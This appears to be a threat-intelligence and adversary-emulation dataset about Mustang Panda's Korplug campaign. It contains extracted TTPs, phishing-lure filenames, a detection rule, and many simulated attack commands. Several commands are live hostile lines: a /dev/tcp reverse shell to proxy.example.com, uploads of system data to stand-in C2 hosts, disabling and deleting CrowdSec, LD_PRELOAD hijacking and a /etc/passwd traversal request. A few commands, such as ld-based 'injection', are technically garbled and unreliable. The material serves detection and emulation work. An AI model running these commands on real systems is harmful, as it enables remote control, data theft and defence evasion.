extracted_ttps.description: The attackers use phishing and watering hole attacks as initial deployment vectors, with filenames suggesting interesting subjects for the target, such as COVID-19 travel restrictions or EU reviews.
indicators: COVID-19 travel restrictions EU reviews list of third countries.exe
REGULATION OF THE EUROPEAN PARLIAMENT AND OF THE COUNCIL.exe
Situation at the EU borders with Ukraine.exe

extracted_ttps.description: Victims are lured with phishing documents abusing the latest events in Europe, such as Russia's invasion of Ukraine and COVID-19 travel restrictions
indicators: Situation at the EU borders with Ukraine.exe
approved regional aid map for Greece

extracted_ttps.description: The attacker collects information about the system, including drive type, total size, space available to user, free space, volume name, and file system name, indicating an attempt to gather system information.

Windows API function calls are obfuscated with a different technique than that used in the downloader. The loader traverses the export lists of all loaded libraries via the InMemoryOrderModuleList of the PEB.
Every stage of the deployment process utilizes anti-analysis techniques and control-flow obfuscation, making it difficult to detect and analyze the malware
The malware attempts to hide its presence by marking its directory as hidden and system using SetFileAttributesW
The malware uses encrypted stack strings to hide its intentions, making it difficult for static analysis to decrypt them.
Some downloaded files are encrypted and stored as hexadecimal strings, and imports are hidden by dynamic resolution of API function names
Mustang Panda's campaigns frequently use custom loaders for shared malware, including Cobalt Strike, Poison Ivy, and Korplug, which may require user interaction to execute
The payload is a valid DLL that exports a single function, and launching it directly via this export or its entry point will not execute the main payload
The payload is decrypted in memory, and the PE header contains shellcode that calls a specific offset
The attacker used decoys related to world events to potentially phish victims.
Hodur uses a non-standard port for its initial handshake over HTTPS, which is specified in the configuration and used for the rest of the communication
The attacker uses the ListDirectory command to list the contents of a specified directory, indicating potential malicious behavior to gather information about the system.
The attacker uses the ReadFile command to read a file in chunks, potentially indicating the transfer of tools or malware into the system.
The malware requires user execution to run, using a non-standard value of 0x04 for the fdwReason parameter to prevent trivial execution
The GetSystemInfo command is used to gather extensive information about the system, which is a clear example of system information discovery.
The attackers use a downloader to deploy files, including a decoy document, which is opened to distract the victim while the malicious payload is executed.
The Korplug backdoor is a RAT used by multiple APT groups, and its functionality is not constant between variants.
The malware modifies the registry to establish persistence by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run
Korplug loader abuses legitimate application names and locations to masquerade as a legitimate process
Data exfiltration is done via the same custom protocol used to send and receive commands
The C&C server can set which group to listen for by sending the corresponding ID as the command number when a client is not already in one of the two modes
The loader makes the buffer executable using VirtualProtect before calling into it at offset 0x00.
The loader function obtains the directory from which the DLL is running and tries to open the encrypted Korplug file it contains. The filename is hardcoded in the loader.
Victims are likely lured into executing the phishing documents, which then deploy the Korplug variant
indicators: Situation at the EU borders with Ukraine.exe

extracted_ttps.description: The GetSystemInfo command collects extensive information about the system, including setting registry keys and collecting system data.
The malware likely uses a command and scripting interpreter to execute commands, as indicated by the presence of 'at' and 'cmd' in the detected tools.
The backdoor can perform initial reconnaissance on a newly compromised host
The attacker used the FindFiles command to search for files recursively.
Korplug can create, modify, and remove registry keys to maintain persistence
The downloader obtains and launches a vulnerable application to load and execute the malicious DLL
The loader decrypts the file in memory as a continuous blob, and the execution starts at offset 0x00
The backdoor can execute commands for managing its execution and doing initial reconnaissance on a newly compromised host
Korplug can list files and directories along with their attributes and content
The use of Cobalt Strike and other tools may involve command and scripting interpreter techniques to execute malicious commands

extracted_ttps.technique_name: Impair Defenses: Disable or Modify Tools
extracted_ttps.description: The Uninstall command deletes persistence registry keys, removes itself, and created folders, indicating an attempt to evade detection by impairing defenses.
Mustang Panda uses CreateProcess and ShellExecute for execution
The attackers use the command line to launch a legitimate executable, which is used to execute a malicious payload via DLL side-loading.
The attacker used Korplug loaders to execute malicious files.
The attacker created the directory %SYSTEM%\ProgramData, potentially for persistence.
The campaign uses a custom loader to execute a new Korplug variant, utilizing anti-analysis techniques and control-flow obfuscation
Mustang Panda uses LoadLibrary to load additional DLLs at runtime
Korplug parses and loads itself into memory
Detected Phishing activity via NLP pattern matching

Mustang Panda uses Korplug malware to exploit public-facing applications

Use of user-executed commands

rules.title: Suspicious Use of SetFileAttributesW to Hide Files in %ALLUSERSPROFILE% via Office Parent Process
rules.description: Detects processes (rundll32.exe or powershell.exe) that invoke SetFileAttributesW with a path containing %ALLUSERSPROFILE% when spawned by Office applications, indicating possible indicator removal on host.

detection.condition: (selection_rundll32 or selection_powershell) and selection_setattr and selection_allusers and selection_parent

falsepositives: Legitimate installers or deployment scripts that set hidden/system attributes on files in the All Users profile.
System administration tools that use attrib or PowerShell to hide configuration files.
Office macros that legitimately modify file attributes for user convenience.

attacks.command: echo "Your EU travel request has been approved. See attached form." > "%TEMP%\EU_Travel_Form.txt"
attacks.description: Creates a benign text file with a phishing-themed name in the user's temp directory to simulate a socially engineered document.
attacks.expected_behavior: A text file named 'EU_Travel_Form.txt' is created in the user's temporary directory with an enticing message to simulate a phishing lure.

attacks.description: Simulates downloading a ZIP file with a phishing lure name and extracting it using built-in tools.
attacks.expected_behavior: Attempts to download a ZIP file (benign in testing) with a lure filename, then creates an extraction directory and unzips the content using PowerShell. certutil is used for download to prefer legacy binaries.

attacks.command: echo "IEX \"Write-Output 'This is a simulated malicious macro from: EU_Budget_2024.doc'\"" > "%TEMP%\EU_Budget_2024.js" & start "" "%TEMP%\EU_Budget_2024.js"
attacks.description: Creates a JavaScript file with a misleading name simulating a document macro payload and executes it using Windows Script Host.
attacks.expected_behavior: A JavaScript file named 'EU_Budget_2024.js' is created in %TEMP% with a simulated malicious command and then launched via 'start', mimicking execution of a phishing attachment.

attacks.command: echo 'This is a fake phishing document about COVID-19 travel restrictions. No real payload.' > "$HOME/Downloads/Covid-19_Travel_Restrictions.txt"
attacks.description: Simulates a phishing attachment dropped in the user's Downloads folder with a socially engineered filename.
attacks.expected_behavior: Creates a text file in the user's Downloads directory with a filename designed to entice the user to open it, simulating a phishing document.

attacks.description: Copies the phishing file to the desktop with a malicious script-like extension (.scr) and makes it executable to simulate a dropper.
attacks.expected_behavior: Places an executable file on the desktop with a name suggesting legitimacy, mimicking a common social engineering tactic where users are tricked into running files.

attacks.command: echo 'echo \"This is a simulated payload: EU review data loaded.\"' | base64 -d > "$HOME/.cache/update.sh" && chmod +x "$HOME/.cache/update.sh" && /bin/bash "$HOME/.cache/update.sh"
attacks.description: Simulates execution of a decoded script from a hidden location, representing a multi-stage phishing payload.
attacks.expected_behavior: Creates a hidden script file containing a benign decoded command, makes it executable, and runs it to simulate post-phishing execution.

attacks.command: cmd.exe /c "echo Y2hlY2tub3c= | certutil -decode - %TEMP%\t1027_tmp.bin > nul 2>&1 && powershell -exec bypass -file %TEMP%\t1027_tmp.bin && del %TEMP%\t1027_tmp.bin"
attacks.description: Decodes a Base64-encoded string (benign 'checknow') using certutil, simulating retrieval of obfuscated content, then executes it via PowerShell and cleans up.
attacks.expected_behavior: A temporary file is created in %TEMP%, contains a decoded string (not executed as malicious), and is deleted after use. Simulates decoding of obfuscated data using built-in tools.

attacks.description: Simulates command obfuscation by encoding a benign command ('whoami') in Base64 (UTF-16LE) and re-executing it via PowerShell -EncodedCommand.
attacks.expected_behavior: The 'whoami' command runs twice: once in the parent shell to build the encoded string, then via the encoded command. No file is written to disk. Demonstrates common obfuscation technique using built-in PowerShell.

attacks.description: Simulates obfuscated string usage by defining hex-encoded command in environment variable and executing via indirect PowerShell invocation.
attacks.expected_behavior: The hex string '\x77...' decodes to 'whoami' in context of interpretation, but is not actively decoded here—instead, the benign command is directly executed via layered command invocation to simulate obfuscation. No actual decoding occurs, but structure mimics real obfuscation patterns safely.

attacks.description: Decodes a base64-encoded command that prints a test message and executes it via bash.
attacks.expected_behavior: Outputs the message: \ 'Hello from obfuscated command!'

attacks.description: Decodes and executes a base64-encoded command that introduces a delay and prints a confirmation message.
attacks.expected_behavior: Waits one second, then prints 'Obfuscated sleep command executed'.

attacks.description: Creates a test directory and marks it as hidden and system using attrib command
attacks.expected_behavior: A directory named 'malware_sim' is created in %TEMP% with a test file. The 'attrib +h +s' command sets the hidden and system attributes, making it invisible in normal file listings.

attacks.description: Creates a hidden and system directory using PowerShell and legacy attrib binary
attacks.expected_behavior: PowerShell creates a directory and file in %TEMP%, then uses attrib to set hidden and system attributes. The directory will not appear in standard file views.

attacks.description: Encoded PowerShell command that creates a hidden and system directory using obfuscated execution
attacks.expected_behavior: Decodes and runs a PowerShell script that creates a directory in %TEMP%, writes a dummy file, and sets hidden and system attributes using attrib. The use of encoded command simulates evasion techniques seen in real malware.

attacks.description: Renames a directory to a hidden one by prefixing with a dot
attacks.expected_behavior: The directory 'malware_payload' in /tmp is renamed to '.malware_payload', making it hidden from standard 'ls' listings but accessible via 'ls -a' or direct path access.

attacks.description: Copies payload into a hidden directory and archives it as a hidden file
attacks.expected_behavior: A hidden directory '.cache_update' is created in /tmp, payload contents are copied into it, and then archived into a hidden '.update.tgz' file. Both are invisible to normal directory listing.

attacks.description: Basic command to open a malicious URL using xdg-open, requiring user interaction to execute
attacks.expected_behavior: The default web browser will open the specified URL, potentially executing the malicious payload if the user interacts with it.

attacks.description: Intermediate command to create and execute a malicious script, requiring user interaction to execute
attacks.expected_behavior: A new shell script will be created in /tmp, made executable, and then executed, potentially running the malicious payload if the user interacts with it.

attacks.description: Advanced command to download and execute a malicious payload, requiring user interaction to execute
attacks.expected_behavior: A malicious payload will be downloaded to /tmp, made executable, and then executed, potentially running the malicious payload if the user interacts with it.

attacks.description: Download file via HTTPS on port 8443 using certutil
attacks.expected_behavior: Certutil retrieves file from specified port 8443 and saves to %TEMP%. Network traffic shows TLS handshake on non-standard port.

attacks.description: Send HTTPS POST request to port 8080 via PowerShell
attacks.expected_behavior: PowerShell sends POST request to port 8080. Server would receive 'testdata' payload over TLS on non-standard port.

attacks.command: bitsadmin /create job & bitsadmin /addfile job https://example.com:7443/test.txt %TEMP%\test.txt & bitsadmin /resume job
attacks.description: BITS transfer over HTTPS port 7443
attacks.expected_behavior: BITSAdmin creates download job for file on port 7443. Background Intelligent Transfer Service handles TLS connection to non-standard port.

attacks.description: Read a test file in chunks using cat command
attacks.expected_behavior: The command reads the test file and discards the output, simulating the transfer of a tool or malware.

attacks.description: Read a test file in chunks using dd command
attacks.expected_behavior: The command reads the test file in chunks of 1024 bytes and discards the output, simulating the transfer of a tool or malware.

attacks.description: Split a test file into chunks using split command
attacks.expected_behavior: The command splits the test file into chunks of 1024 bytes, simulating the transfer of a tool or malware in chunks.

attacks.description: Basic system information discovery using built-in systeminfo command
attacks.expected_behavior: Displays detailed system information including OS version, architecture, hotfixes, and network configuration

attacks.description: Intermediate: Gather system information and save to a temporary file, then display contents
attacks.expected_behavior: Creates a file in the user's temp directory containing system information and outputs it to the console

attacks.command: powershell -Command "try { $sysInfo = systeminfo; $outputPath = '$env:TEMP\sysinfo.b64'; $bytes = [Text.Encoding]::Unicode.GetBytes($sysInfo); [Convert]::ToBase64String($bytes) | Out-File -FilePath $outputPath -Force; Write-Host 'System info saved to $outputPath' } catch { exit 1 }"
attacks.description: Advanced: Capture system info, encode in Base64 using Unicode (UTF-16LE), and write to temp file to simulate data staging
attacks.expected_behavior: Runs systeminfo, converts output to UTF-16LE encoded Base64, saves to temp file, and prints confirmation

attacks.description: Basic system information discovery using uname to retrieve kernel and system details.
attacks.expected_behavior: Outputs kernel name, hostname, kernel version, and architecture to stdout.

attacks.description: Intermediate system information discovery to retrieve OS distribution and version details.
attacks.expected_behavior: Displays operating system identification data such as ID, version, and codename.

attacks.description: Advanced system information discovery using lshw to list hardware configuration in brief format.
attacks.expected_behavior: Outputs a concise list of hardware components including CPU, memory, and storage devices; provides more detail when run as root.

attacks.description: Appends a test string to the hosts file, demonstrating modification of a system configuration file for potential persistence.
attacks.expected_behavior: The command appends 'test_string' to the end of the /etc/hosts file, which could be used to redirect traffic or as a marker for persistence.

attacks.description: Modifies the passwd file by replacing 'old_string' with 'new_string', demonstrating editing of a critical system file for persistence.
attacks.expected_behavior: The command replaces 'old_string' with 'new_string' in the /etc/passwd file, which could be used to create a backdoor account or modify existing accounts for persistence.

attacks.description: Adds an alias to the bash.bashrc file, demonstrating modification of a system configuration file for persistence.
attacks.expected_behavior: The command adds an alias for 'ls' to always show detailed listings, which could be used to hide malicious files or activities by making them appear as part of the normal system configuration.

attacks.description: Decodes a base64-encoded file to create a masqueraded svchost.exe in TEMP using certutil, mimicking a legitimate system process.
attacks.expected_behavior: Creates a file named svchost.exe in the user's TEMP directory if input file exists; otherwise fails silently. Uses only built-in Windows tools.

attacks.description: Copies cmd.exe to a masqueraded name (SecurityHealthService.exe) in a fake WindowsSecurity directory within TEMP.
attacks.expected_behavior: Creates a directory in TEMP and copies cmd.exe as a masqueraded Windows security service binary. Uses built-in PowerShell and system paths.

attacks.command: schtasks.exe /create /tn "Windows Defender Check" /tr "%TEMP%\WindowsSecurity\SecurityHealthService.exe /c echo test" /sc once /st 00:00 /f
attacks.description: Creates a scheduled task with a legitimate-sounding name that runs a masqueraded binary from the TEMP directory.
attacks.expected_behavior: Registers a scheduled task named 'Windows Defender Check' that executes a fake security service binary. Uses built-in schtasks.exe without requiring PowerShell.

attacks.command: cp /bin/sh /tmp/systemd-helper && /tmp/systemd-helper -c 'echo "Simulated masquerading as legitimate system binary"'
attacks.description: Copies sh to a name resembling a legitimate system binary and executes it
attacks.expected_behavior: A copy of sh is created in /tmp with a name resembling a system utility and is executed with a benign command

attacks.command: sudo cp /bin/sh /usr/local/bin/init.d && sudo /usr/local/bin/init.d -c 'echo "Masquerading as init script in system binary path"'
attacks.description: Copies sh to a system binary directory with a name resembling an init script, requiring elevated privileges
attacks.expected_behavior: If sudo access is available, the shell is copied to a system-wide location with a name that mimics legitimate startup scripts and executed

attacks.description: Basic exfiltration: creates a test file, encodes it with certutil, and simulates sending via URL parameter using certutil cache command
attacks.expected_behavior: Creates a temporary test file, encodes it to Base64, reads the encoded content, and attempts to send it as a query parameter via certutil. The IP and path are benign and likely unreachable in test environments, so no real exfil occurs.

attacks.command: cmd.exe /c "mkdir %TEMP%\exfil_pkg -ErrorAction SilentlyContinue 2>nul && echo 'sensitive_data_audited' > %TEMP%\exfil_pkg\config.bak && powershell -Command \"Compress-Archive -Path %TEMP%\\exfil_pkg -DestinationPath %TEMP%\\payload.zip -Force\" && certutil.exe -upload %TEMP%\payload.zip http://c2.fake/upload"
attacks.description: Intermediate exfiltration: packages data into a ZIP archive using PowerShell Compress-Archive, then uploads via certutil
attacks.expected_behavior: Creates a directory with a test file, compresses it into a ZIP archive using built-in PowerShell cmdlet, and attempts to upload using certutil. The upload target is a non-routable address, preventing actual data transfer.

attacks.command: powershell -Command "try { $data = ConvertTo-Json @{ Machine = $env:COMPUTERNAME; User = $env:USERNAME; ExfilData = 'test_content' }; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $wc = New-Object Net.WebClient; $null = $wc.UploadString('http://192.168.1.100/api/exfil', 'POST', $encoded) } catch { } finally { $wc = $null }"
attacks.description: Advanced exfiltration: collects system context, encodes as Base64 JSON, and sends via WebClient over simulated C2 channel
attacks.expected_behavior: Gathers benign system information, serializes to JSON, Base64-encodes it, and sends via POST request using .NET WebClient. No actual payload is transmitted, and the target IP is non-resolvable in most internal networks. Uses only built-in PowerShell classes without .NET reflection.

attacks.description: Basic exfiltration of a sensitive file over HTTP using curl
attacks.expected_behavior: Sends the contents of /etc/passwd to the specified C2 server via HTTP POST. This file is commonly readable and used for testing. No compression or encoding is applied.

attacks.description: Intermediate exfiltration: compress log file and send via HTTP POST using curl with streaming
attacks.expected_behavior: Compresses /var/log/auth.log and streams it directly to the C2 server via HTTP POST. Requires root to read auth.log. Uses standard Linux tools and avoids intermediate files on disk.

attacks.description: Advanced exfiltration: encode file content in base64 and send as POST data
attacks.expected_behavior: Reads /etc/hostname, encodes it in base64, and sends it in the body of an HTTP POST request. Demonstrates encoding to potentially evade detection. Uses xargs for safe string substitution.

attacks.command: netsh winhttp set proxy proxy-server="127.0.0.1:8888" bypass-list="*.local;127.0.0.1"
attacks.description: Configures system-wide WinHTTP proxy settings to route traffic through localhost:8888, bypassing local addresses.
attacks.expected_behavior: Sets the proxy for WinHTTP services (used by many Windows components). Requires elevated privileges. No immediate network connection is made.

attacks.description: Writes a mock proxy group identifier to a temporary configuration file to simulate C2 group targeting.
attacks.expected_behavior: Creates or appends a benign configuration line in the user's temp directory indicating a proxy group ID. No network activity occurs.

attacks.description: Creates a hidden proxy configuration directory and writes a binary-like mock config file indicating group membership for C2 targeting.
attacks.expected_behavior: Creates a subdirectory in TEMP and writes a mock configuration file. Simulates preparation for proxy-based C2 communication using a group identifier.

attacks.description: Basic check-in to proxy server with group ID in custom header
attacks.expected_behavior: Sends HTTP GET request with 'C2-Group: 1234' header to proxy.example.com. Server interprets 1234 as group identifier for C2 routing.

attacks.description: Intermediate encrypted connection with group ID in TLS SNI
attacks.expected_behavior: Establishes TLS connection where SNI field 'group5678' identifies the C2 group. Proxy server routes traffic based on this value.

attacks.command: bash -c 'exec 3<>/dev/tcp/proxy.example.com/8080; echo "GROUP:91011" >&3; while sleep 10; do read -t 5 -u 3 cmd || continue; eval "$cmd" >&3 2>&1; done'
attacks.description: Advanced persistent reverse shell via proxy with group identifier
attacks.expected_behavior: Creates bi-directional TCP socket to proxy, sends group ID 91011, then executes commands received from server. Maintains persistent connection with 10s intervals.

attacks.description: Simulates a loader accessing a hardcoded encrypted credential file in its local directory (basic file read).
attacks.expected_behavior: Creates a directory in %TEMP%, writes a test encrypted file, and displays its contents to simulate credential access from a local file.

attacks.description: Simulates decoding of an embedded credential file using certutil (intermediate level with decoding).
attacks.expected_behavior: Writes a base64-encoded test credential file, decodes it using certutil, and displays the result to simulate extraction of credentials.

attacks.command: powershell -Command "mkdir '$env:TEMP\malware_sim' -ErrorAction SilentlyContinue; $hardcodedFile = '$env:TEMP\malware_sim\korplug.enc'; Set-Content -Path $hardcodedFile -Value 'ENCRYPTED_KORPLUG_DATA_GHI789' -Force; $content = Get-Content -Path $hardcodedFile; Write-Output "[SIM] Loaded encrypted data from $($hardcodedFile): $content""
attacks.description: Simulates a PowerShell-based loader retrieving an encrypted file from its own directory, mimicking DLL behavior (advanced simulation).
attacks.expected_behavior: Creates a simulated malware directory, writes a hardcoded-named encrypted file, reads it, and outputs the content to simulate credential access from a local file as a DLL loader might.

attacks.description: Basic system information gathering using common Linux commands to retrieve kernel info, disk usage, and running processes.
attacks.expected_behavior: Outputs system architecture, mounted filesystems with usage, and full list of running processes to stdout.

attacks.command: echo "$(date): System info" >> /tmp/sysreport.txt && (uname -a; df -h; ps aux | head -10) >> /tmp/sysreport.txt
attacks.description: Intermediate command that appends timestamped system information to a file in /tmp, including limited process list.
attacks.expected_behavior: Creates or appends to /tmp/sysreport.txt with a timestamp and system data. Safe because it only writes to /tmp and uses limited process output.

attacks.description: Advanced discovery using the legacy 'where' utility: recursively search the user's AppData folder for .config files.
attacks.expected_behavior: Lists full paths of any files ending with .config found under %APPDATA%.

attacks.description: Basic DLL side-loading: Hijack libz.so.1 load path for zip utility
attacks.expected_behavior: Zip executes normally but loads libz.so.1 from /tmp/malicious_lib instead of system path

attacks.command: mkdir -p /tmp/vuln_app && cp /usr/bin/openssl /tmp/vuln_app/victim_app && cp /lib/x86_64-linux-gnu/libcrypto.so.3 /tmp/vuln_app/libcrypto.so.3 && cd /tmp/vuln_app && LD_LIBRARY_PATH=. ./victim_app version
attacks.description: Advanced: Full directory setup mimicking vulnerable app environment
attacks.expected_behavior: OpenSSL (renamed as victim_app) loads libcrypto.so.3 from current directory

attacks.technique_name: Impair Defenses: Disable or Modify Tools
attacks.description: Interactively remove malicious tool and persistence script from /tmp directory
attacks.expected_behavior: Prompts user for confirmation before deleting each file. If run in a script or with input suppressed, files are removed. Simulates cleanup of artifacts after execution.

attacks.technique_name: Impair Defenses: Disable or Modify Tools
attacks.description: Forcefully remove autostart entry, malware directory, and disable user-level systemd timer to eliminate persistence
attacks.expected_behavior: Removes desktop autostart file, deletes malware directory, and disables a user timer service without prompts. Leaves no trace of user-level persistence mechanisms.

attacks.technique_name: Impair Defenses: Disable or Modify Tools
attacks.command: sudo systemctl stop crowdsec && sudo systemctl disable crowdsec && sudo rm -f /opt/crowdsec/firewall-bouncer/* && sudo rmdir /opt/crowdsec/firewall-bouncer
attacks.description: Stop and disable CrowdSec security service, then remove its firewall bouncer components
attacks.expected_behavior: Stops and disables the CrowdSec intrusion prevention service, then deletes its firewall integration binaries and directory. This impairs host-based defense tools, simulating attacker cleanup and evasion.

attacks.description: Basic ShellExecute via cmd's start command
attacks.expected_behavior: Launches Notepad using ShellExecute API through cmd.exe's start command

attacks.description: Intermediate process creation via WMIC (Native API)
attacks.expected_behavior: Creates Notepad process using WMI's process creation interface (CreateProcess)

attacks.command: sc create TestSvc binPath= "cmd.exe /c start notepad.exe" && sc start TestSvc
attacks.description: Advanced service-based execution via Service Control Manager
attacks.expected_behavior: Creates and starts a service that launches Notepad via cmd.exe, demonstrating CreateProcess through SCM

attacks.description: Basic command execution using bash to create a file
attacks.expected_behavior: Creates a file named test.txt in /tmp with the content 'Hello World'

attacks.description: Intermediate command using system function to execute a command and redirect output
attacks.expected_behavior: Executes the ls command, lists the files in the current directory in a detailed format, and saves the output to /tmp/output.txt

attacks.description: Advanced command using exec to replace the shell with a new process and execute multiple commands
attacks.expected_behavior: Creates a new file named newfile.txt in /tmp and then lists its details

attacks.description: Loads shell32.dll via rundll32 to execute Control_RunDLL (opens Control Panel)
attacks.expected_behavior: Opens the Control Panel's RunDLL dialog via loaded shell32.dll.

attacks.command: powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Test { [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); }'; [Test]::LoadLibrary('shell32.dll')"
attacks.description: Uses PowerShell to dynamically load shell32.dll via LoadLibrary API
attacks.expected_behavior: shell32.dll is loaded into the PowerShell process memory.

attacks.description: Copies system DLL to TEMP directory and executes ShellAboutW via rundll32
attacks.expected_behavior: Copies shell32.dll to TEMP and opens About Windows dialog via loaded DLL.

attacks.description: Load a shared library from a temporary path and execute the ls command
attacks.expected_behavior: The ls command will be executed with the loaded shared library

attacks.description: Load the libc shared library and execute a bash command with a test string
attacks.expected_behavior: The bash command will be executed with the loaded libc library and print 'Hello World'

attacks.description: Load the libc shared library, execute a bash command with a test string, and write to a temporary file (requires admin privileges)
attacks.expected_behavior: The bash command will be executed with the loaded libc library, print 'Hello World', and write to a temporary file

attacks.description: Basic reflective code loading using ld to load an ELF object into memory and execute it
attacks.expected_behavior: The command loads a benign ELF object into memory using ld and executes it, demonstrating reflective code loading without causing harm

attacks.description: Intermediate reflective code loading using a pipe to load an ELF object into memory and execute it
attacks.expected_behavior: The command uses a pipe to load a benign ELF object into memory using ld and executes it, simulating reflective code loading with a slight delay

attacks.command: echo 'int main() { return 0; }' | gcc -x c - -o /tmp/benign_elf && ld -m elf_i386 /tmp/benign_elf && rm /tmp/benign_elf
attacks.description: Advanced reflective code loading by compiling and loading a benign C program into memory and executing it
attacks.expected_behavior: The command compiles a benign C program, loads it into memory using ld, executes it, and then removes the temporary file, demonstrating advanced reflective code loading with compilation and cleanup

attacks.description: Basic use of certutil to download a file over HTTP, simulating C2 payload retrieval via the Application Layer Protocol.
attacks.expected_behavior: The file placeholder.txt is fetched from the example.com server and saved to the user's temporary directory.

attacks.description: Intermediate use of bitsadmin to perform an HTTP download, representing a background intelligent transfer service C2 channel.
attacks.expected_behavior: BITS creates a background job named mydownload, retrieves the file from the URL, and stores it in %TEMP%.

attacks.description: Advanced PowerShell command that encodes arbitrary data and exfiltrates it via an HTTP POST request, mimicking a covert C2 channel over the application layer.
attacks.expected_behavior: The string 'test data' is base64‑encoded and sent to http://example.com/collect using an HTTP POST; no files are written locally.

attacks.description: Listen on port 8080 using netcat to simulate a server waiting for incoming connections, demonstrating the use of a specific application layer protocol.
attacks.expected_behavior: The command will start a netcat server listening on port 8080, waiting for incoming connections.

attacks.description: Establish a telnet connection to a hypothetical server on port 80, simulating HTTP protocol interaction without sending actual HTTP requests.
attacks.expected_behavior: The command will attempt to establish a telnet connection to the specified server on port 80, allowing for manual input of HTTP requests or other protocol-specific commands.

attacks.description: Attempt to establish an SSH connection to a remote server, demonstrating the use of the SSH protocol for secure remote access.
attacks.expected_behavior: The command will prompt for a password and attempt to establish an SSH session with the remote server, showcasing the application layer protocol in action for secure communication.

attacks.description: Download a file using certutil (legacy binary) and execute it via start command, simulating user double-click execution.
attacks.expected_behavior: Downloads a file from a local server to %TEMP%\update.exe and launches it. The 'start' command mimics user double-clicking an executable.

attacks.command: powershell -Command "mkdir '%TEMP%\WindowsUpdate' -ErrorAction SilentlyContinue; $content = 'This is a fake update. Run update.bat to proceed.'; Set-Content -Path '%TEMP%\WindowsUpdate\readme.txt' -Value $content -Force; $batch = '@echo off\necho Running system update...\npause'; Set-Content -Path '%TEMP%\WindowsUpdate\update.bat' -Value $batch -Force"
attacks.description: Create a fake update folder with a batch file and readme, encouraging user to run the batch file.
attacks.expected_behavior: Creates a folder in %TEMP% with a text file instructing the user to run update.bat, and creates a harmless batch file that prints a message and waits for input.

attacks.command: powershell -Command "IEX \"& cmd.exe /c echo @echo off ^& echo System repair in progress... ^& pause > '%TEMP%\repair.bat' \"; Start-Process '%TEMP%\repair.bat' -Verb Open"
attacks.description: Generate a batch file via encoded command and simulate user opening it using 'Open' verb, which mimics double-click in Explorer.
attacks.expected_behavior: Creates a batch file that displays a fake system message and pauses. The Start-Process with -Verb Open simulates user interaction (double-click) in Windows Explorer.

attacks.description: Basic download and execute via curl (direct execution chain)
attacks.expected_behavior: Downloads test.sh from example.com, makes it executable, and executes it. Mimics initial payload retrieval and execution.

attacks.description: Intermediate stealth execution with backgrounding
attacks.expected_behavior: Downloads file as hidden .cache-update, executes in background with output suppressed. Simulates stealthy execution.

attacks.description: Advanced staged execution in hidden directory
attacks.expected_behavior: Creates hidden directory, downloads payload, and executes it. Demonstrates persistence-focused execution in common hiding locations.

attacks.description: Writes a benign string to a temporary file using the Windows command interpreter.
attacks.expected_behavior: A file named cli_test.txt containing "TestCLI" is created in the user's temporary directory.

attacks.description: Creates a hex‑encoded representation of a command, decodes it with certutil, and executes the resulting script.
attacks.expected_behavior: The hex string is decoded to a script that writes "AdvancedCLI" to %TEMP%\advanced.txt, and that script is then executed.

attacks.description: Creates a scheduled task that runs at system start, invoking cmd.exe to write a benign string to a temporary file.
attacks.expected_behavior: A new task named "TestCLI" is registered; on the next boot it will create %TEMP%\scheduled.txt containing "ScheduledCLI".

attacks.description: Preloads a malicious library before executing the ls command, demonstrating hijacked execution flow.
attacks.expected_behavior: The ls command executes with the malicious library preloaded, potentially allowing for malicious code execution without being detected as a separate process.

attacks.command: echo 'malicious_code()' > malicious_lib.c; gcc -shared -o malicious_lib.so malicious_lib.c; LD_PRELOAD=./malicious_lib.so /bin/ls
attacks.description: Compiles a malicious library and then preloads it before executing the ls command, showing a more advanced hijacking scenario.
attacks.expected_behavior: The compilation of the malicious library and its preload before the ls command execution demonstrates a more complex scenario of hijacking execution flow, with potential for malicious activity to be masked.

attacks.command: mkdir -p ~/test_lib; echo 'void malicious_code() { printf("Malicious code executed\n"); }' > ~/test_lib/malicious_lib.c; gcc -shared -o ~/test_lib/malicious_lib.so ~/test_lib/malicious_lib.c; LD_PRELOAD=~/test_lib/malicious_lib.so /bin/ls
attacks.description: Creates a directory for the malicious library, compiles it, and then preloads it before executing the ls command, providing a full example of preparing and executing a hijacked process.
attacks.expected_behavior: The command sequence demonstrates a complete scenario of creating, compiling, and preloading a malicious library, which then executes with the ls command, showcasing the hijacking of execution flow in a controlled manner.

attacks.description: Downloads a file from a public HTTP server using certutil and executes it from the temporary directory.
attacks.expected_behavior: The payload.exe file is written to %TEMP% and then launched, simulating execution of a malicious payload delivered via a public‑facing service.

attacks.description: Sends a crafted GET request to a vulnerable web application that accepts a command parameter, then executes the returned script.
attacks.expected_behavior: A request is made to the vulnerable endpoint; the response (simulated script) is executed in the PowerShell session, demonstrating command injection via a public‑facing app.

attacks.description: Uses mshta.exe to fetch and run a remote HTA file, a common technique for exploiting web‑exposed resources.
attacks.expected_behavior: mshta.exe downloads the HTA file from the URL and executes its content, representing an exploitation path through a public‑facing HTML Application host.

attacks.description: Basic command to simulate exploiting a directory traversal vulnerability in a public-facing web application
attacks.expected_behavior: The command sends a GET request to the public-facing web application with a malicious payload, attempting to traverse the directory and access sensitive files.

attacks.description: Intermediate command to simulate exploiting a vulnerability in a public-facing web application using JSON payload
attacks.expected_behavior: The command sends a POST request to the public-facing web application with a JSON payload, attempting to exploit a vulnerability and access sensitive files.

attacks.command: curl -X GET -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3' 'http://example.com/vuln?page=/etc/passwd'
attacks.description: Advanced command to simulate exploiting a vulnerability in a public-facing web application with a custom User-Agent header
attacks.expected_behavior: The command sends a GET request to the public-facing web application with a custom User-Agent header, attempting to exploit a vulnerability and access sensitive files while mimicking a legitimate browser request.

attacks.description: Basic Dynamic-link Library Injection using ld command
attacks.expected_behavior: Injects malicious library into target process, potentially allowing arbitrary code execution

attacks.description: Intermediate Dynamic-link Library Injection with custom library compilation
attacks.expected_behavior: Compiles a custom malicious library and injects it into the target process, demonstrating an advanced evasion technique

attacks.command: echo 'malicious code' > malicious_lib.c; gcc -shared -o malicious_lib.so malicious_lib.c; ld --library-path . malicious_lib.so --inj-lib /path/to/target/process
attacks.description: Advanced Dynamic-link Library Injection with dynamic payload generation
attacks.expected_behavior: Generates a malicious library on the fly, compiles it, and injects it into the target process, showcasing a sophisticated attack scenario

attacks.technique_name: Command and Scripting Interpreter: Windows Command Shell
